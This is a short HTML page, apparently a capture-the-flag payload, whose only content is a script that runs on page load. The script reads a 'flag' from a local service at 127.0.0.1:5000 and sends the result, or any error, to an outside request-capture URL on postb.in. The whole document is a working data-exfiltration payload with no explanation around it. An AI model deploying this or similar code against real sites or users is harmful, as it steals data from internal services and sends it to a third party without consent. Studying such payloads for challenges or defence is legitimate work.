<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Cache-Control" content="max-age=3600">
</head>
<body>
<script>
  const EXFIL = "https://www.postb.in/1778660481006-3008019395638";

  fetch("http://127.0.0.1:5000/flag")
    .then(r => r.text())
    .then(data => {
      return fetch(EXFIL + "?flag=" + encodeURIComponent(data));
    })
    .catch(e => {
      fetch(EXFIL + "?err=" + encodeURIComponent(e.toString()));
    });
</script>
</body>
</html>
